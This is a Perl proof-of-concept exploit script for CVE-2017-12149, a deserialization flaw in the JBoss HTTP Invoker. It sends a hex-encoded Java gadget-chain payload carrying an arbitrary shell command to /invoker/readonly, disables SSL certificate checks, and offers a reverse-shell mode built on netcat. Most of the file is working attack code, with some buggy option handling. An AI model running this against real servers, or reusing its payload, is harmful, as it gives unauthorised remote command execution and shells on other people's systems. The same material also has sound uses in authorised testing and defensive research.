#!/usr/bin/perl
# Server: Apache-Coyote/1.1
# WWW-Authenticate: Basic realm="JBoss HTTP Invoker"

use 5.10.0;
use utf8;
use strict;
use warnings;

no warnings 'experimental';

BEGIN {
    my $error = 0;
    my @modules = ("MIME::Base64", "String::HexConvert", "Data::Dump", "Getopt::Long", "LWP::UserAgent", "HTTP::Request", "HTTP::Response", "HTTP::Cookies", "IO::Socket::SSL");
    
    foreach my $module (@modules) {
        eval "use $module";
        if($@) {
            print "[-] Perl Module [$module] Not Found\n";
            print "\n\t-> Please Install It By Running The Following Command :\n\t cpan -i $module\n";
            $error = 1;
        }
    }
    die() if($error);
    
    use Data::Dump qw(dump);
    use String::HexConvert ":all";
    
    # Remove SSL Certs Validity Checks
    
    $ENV{'PERL_LWP_SSL_VERIFY_HOSTNAME'} = 0;
    
    $ENV{HTTPS_DEBUG} = 1;
    
    IO::Socket::SSL::set_ctx_defaults(
        SSL_verifycn_scheme => 'www',
        SSL_verify_mode => 0,
    );
    
};

# Global Variables
my $host = "127.0.0.1";
my $port = 9080;
my $scheme = "http";
my $path = "/";
my $username = "admin";
my $password = "admin";
my $command = "id";
my $cmd_output_file = "/tmp/hell";
my $mode = "cmd_exec";
my $rev_host = "0.0.0.0";
my $rev_port = "31337";
my $url = 0;
my $debug = 0;
my $b64_credentials = 0;

# Get Options/arguments
GetOptions(
    "host=s"          => \$host,
    "port=i"          => \$port,
    "username=s"      => \$username,
    "password"        => \$password,
    "scheme=s"        => \$scheme,
    "path=s"          => \$path,
    "cmd=s"           => \$command,
    "mode"            => \$mode,
    "rev-host"        => \$rev_host,
    "rev-port"        => \$rev_port,
    "--debug!"        => \$debug,
) or help();

# Display The Header
header();

$url = $scheme . '://' . $host . ':' . $port . $path;
$b64_credentials = encode("$username:$password");

if($mode =~ /revshell/i) {
    $command = "nc 0.0.0.0 31337";
}

if($command) {
    if($host =~ /127\.0\.0\.1|localhost/i) {
        system("rm -rf $cmd_output_file") if(-f$cmd_output_file);
        $command .= " > $cmd_output_file";
    }
    $command =~ s/ /\$\{IFS\}/gi;
    $command = '/bin/bash -c ' . $command;
} else {
    die("[-] Error : You Must Specify A COmmand To Run With : --cmd\n");
}

# Run The PoC
exploit($url);


sub header {
    print "\n\n";
    my $title = "=================================[ CVE-2017-12149 ]=================================";
    
    print qq{
        $title
        
        Reporter :
        Date :
        CVE : CVE-2017-12149
        
        Description :
        
        
        In Jboss Application Server as shipped with Red Hat Enterprise
        Application Platform 5.2, it was found that the doFilter method in the
        ReadOnlyAccessFilter of the HTTP Invoker does not restrict classes for
        which it performs deserialization and thus allowing an attacker to
        execute arbitrary code via crafted serialized data.
        
        
    };
    print "="x(length($title)) . "\n\n";
}

sub help {
    print "\n";
    print qq {  
        
        # Usage :
        
        perl $0 --host <HOST> --port <PORT> [OPTIONS]
        
        # Options :
        
        --host           : Server Hostname / IP [Default: $host]
        --port           : Port To Use For The HTTP Virtual Host [Default: $port] (Shouldn't Be Already Used)
        --cmd            : Malicious Command To Run On The Vulnerable Server [Default: $command]
        --username       : HTTP Authentification Username [Default: $username]
        --pasword        : HTTP Authentification Password [Default: $password]
        --scheme         : URL Scheme [Default: $scheme]
        --path           : JBoss Installation Path [Default: $path]
        --mode           : Exploit Mode. Use "revsehll" For Remote Host [Default: $mode]
        --rev-host       : Host To Backconnect On With Mode "revshell" [Default: $rev_host]
        --rev-port       : Port To Backconnect On With Mode "revshell" [Default: $rev_port]
        
        # Exemple :
        
        perl $0 --host $host --port $port --username $username --passowrd $password --cmd '$command'
        
    };
    print "\n\n";
    exit;
}

sub buildRequester {
    my ( $useragent, $timeout, $proxy ) = @_;
    $proxy = 0 if(!defined($proxy));
    my $browser = 0;
    my $cookie_jar = 0;
    
    $cookie_jar = HTTP::Cookies->new(
        file     => "/tmp/cookies.lwp",
        autosave => 1,
    );
    
    $browser = LWP::UserAgent->new();
    $browser->protocols_allowed( [qw( http https ftp )] );
    $browser->requests_redirectable(['GET', 'POST', 'HEAD', 'OPTIONS']);
    $browser->cookie_jar( $cookie_jar);
    
    ### Custom Options
    $browser->timeout($timeout);
    $browser->agent($useragent);
    
    if($proxy) {
        $browser->proxy( [qw( http https ftp ftps )] => $proxy);
    }
    
    return $browser;
}

sub buildRequest {
    my ( $url, $method, $payload, $content_type) = @_;
    $content_type = 'application/x-www-form-urlencoded' if(!defined($content_type));
    $payload = '' if(!defined($payload));
    $method = uc($method);
    my $request = 0;
    
    if($method eq "GET") {
        $request = new HTTP::Request $method, $url . '?' . $payload;
    } else {
        $request = new HTTP::Request $method, $url;
        $request->content($payload);
    }
    $request->content_type($content_type);
    
    $request->header("Authorization" => "Basic $b64_credentials") if($b64_credentials);
    $request->header("Accept-Encoding" => "identity");
    $request->header("Connection" => "keep-alive");
    $request->header("Accept" => "text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2");
    $request->header("User-Agent" => "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36");
    #$request->header("ContentType" => "application/x-java-serialized-object; class=org.jboss.invocation.MarshalledInvocation")
    
    return $request;
}

sub buildPayload {
    my ( $command ) = @_;
   
    my $payload = hex_to_ascii("ACED0005737200116A6176612E7574696C2E48617368536574BA44859596B8B7340300007870770C000000023F40000000000001737200346F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E6B657976616C75652E546965644D6170456E7472798AADD29B39C11FDB0200024C00036B65797400124C6A6176612F6C616E672F4F626A6563743B4C00036D617074000F4C6A6176612F7574696C2F4D61703B787074002668747470733A2F2F6769746875622E636F6D2F6A6F616F6D61746F73662F6A6578626F7373207372002A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E6D61702E4C617A794D61706EE594829E7910940300014C0007666163746F727974002C4C6F72672F6170616368652F636F6D6D6F6E732F636F6C6C656374696F6E732F5472616E73666F726D65723B78707372003A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E63746F72732E436861696E65645472616E73666F726D657230C797EC287A97040200015B000D695472616E73666F726D65727374002D5B4C6F72672F6170616368652F636F6D6D6F6E732F636F6C6C656374696F6E732F5472616E73666F726D65723B78707572002D5B4C6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E5472616E73666F726D65723BBD562AF1D83418990200007870000000057372003B6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E63746F72732E436F6E7374616E745472616E73666F726D6572587690114102B1940200014C000969436F6E7374616E7471007E00037870767200116A6176612E6C616E672E52756E74696D65000000000000000000000078707372003A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E63746F72732E496E766F6B65725472616E73666F726D657287E8FF6B7B7CCE380200035B000569417267737400135B4C6A6176612F6C616E672F4F626A6563743B4C000B694D6574686F644E616D657400124C6A6176612F6C616E672F537472696E673B5B000B69506172616D54797065737400125B4C6A6176612F6C616E672F436C6173733B7870757200135B4C6A6176612E6C616E672E4F626A6563743B90CE589F1073296C02000078700000000274000a67657452756E74696D65757200125B4C6A6176612E6C616E672E436C6173733BAB16D7AECBCD5A990200007870000000007400096765744D6574686F647571007E001B00000002767200106A6176612E6C616E672E537472696E67A0F0A4387A3BB34202000078707671007E001B7371007E00137571007E001800000002707571007E001800000000740006696E766F6B657571007E001B00000002767200106A6176612E6C616E672E4F626A656374000000000000000000000078707671007E00187371007E0013757200135B4C6A6176612E6C616E672E537472696E673BADD256E7E91D7B470200007870000000017400");
    
    $payload .= join("\\", split(//, chr(length($command))));
    $payload .= $command;
    
    $payload .= hex_to_ascii("740004657865637571007E001B0000000171007E00207371007E000F737200116A6176612E6C616E672E496E746567657212E2A0A4F781873802000149000576616C7565787200106A6176612E6C616E672E4E756D62657286AC951D0B94E08B020000787000000001737200116A6176612E7574696C2E486173684D61700507DAC1C31660D103000246000a6C6F6164466163746F724900097468726573686F6C6478703F4000000000000077080000001000000000787878");
    
    return $payload;
}

sub encode {
    my ( $string ) = @_;
    my $string_encoded = 0;
    
    $string_encoded = encode_base64($string);
    chomp $string_encoded;
    
    return $string_encoded;
}

sub exploit {
    my ( $url ) = @_;
    my $browser = 0;
    my $useragent = '';
    my $request = 0;
    my $response = 0;
    my $exploit_path = '/invoker/readonly';
    my $proxy = 0;
    my $vulnerable = 1;
    my $timeout = 30;
    
    ### Setting Up The Requester
    $browser = buildRequester($useragent, $timeout, $proxy);
    
    ### Build/send the requests
    
        print "[*] Checking Exploit Path's Existence ..\n";
        $request = buildRequest($url . $exploit_path, "GET", "", "application/octet-stream");
        $response = $browser->request($request);
        if($response->code =~ /200/) {
            print "[+] Exploit Path Is Available.\n";
        } elsif($response->code =~ /401/) {
            print "[!] The Credentials Provided May Be Wrong.\n";
        } else {
            print "[-] Unexpected Response From The Server : " . $response->code . "\n\n";
        }
        
        
        print "[*] Sending Injection Using User : admin On : $path\n";
        print "\t=> Authorization : $b64_credentials\n\t=> Command : $command\n" if($debug);
        $request = buildRequest($url . $exploit_path, "POST", buildPayload($command), "application/x-java-serialized-object; class=github.com/joaomatosf/jexboss");
        $response = $browser->request($request);
        
        if($debug) {
            print dump($request) . "\n" . '-'x80 . "\n" . dump($response) . "\n\n";
        } else {
            print "\t => " . $request->uri . " (" . $response->code . ")\n\n";
        }
        
        ### Validate or not the test
        if($host =~ /127\.0\.0\.1|localhost/i) {
            if(-f $cmd_output_file) {
            print "[VULNERABLE] $url is vulnerable\n\t=> $cmd_output_file was created .";
            } else {
                print "[NOT VULNERABLE] $url is not affected.\n";
            }
        } else {
            if($mode eq 'revshell') {
                system("nc -l -p $rev_port");
            } else {
                print "[UNKNOW] $host seems to be a remote host and a custom command was provided.\nI can't check by myself if the exploit worked.\n Please try : --mode revshell\n";
            }
        }
}

sub read_file {
    my ($file, $chomp) = @_;
    $chomp = 0 if(!defined($chomp));
    
    my @final_content = ();
    
    open FILE, $file or die Error("$file Couldn't Be Read  .");
    my @content = <FILE>;
    close FILE;
    
    if($chomp) {
        foreach my $line (@content) {
            chomp $line;
            push(@final_content, $line);
        }
    } else {
        @final_content = @content;   
    }
    
    return @final_content;
}

sub validate {
    my ( $validation_mode, $validation_value, $response ) = @_;
    my $value = 0;
    my $positive = 1;
    my $type = substr($validation_mode, 1, length($validation_mode));
    
    $positive = 0 if(substr(uc($validation_mode), 0, 1) eq 'F');
    
    given(substr($validation_mode, 1, length($validation_mode))) {
        
        when(/CODE/i) { $value = $response->code; }
        
        when(/SIZE/i) { $value = length($response->content); }
        
        when(/STRING|REGEX/i) {  $value = $response->content; }
        
        when(/HEADER/i) {
            my @header_parts = split(':', $validation_value);
            
            if($header_parts[0]) {
                if($response->header($header_parts[0])) {
                    if($header_parts[1]) {
                        return $positive if($response->header($header_parts[0]) =~ $header_parts[1]);
                    } else {
                        return $positive;
                    }
                } else {
                    return 0;
                }
            } else {
                return 0;
            }
        }
    }
    
    if($validation_value && $validation_value =~ /$value/i || $validation_value eq $value) {
        return $positive;
    }
    
    return 0;
}
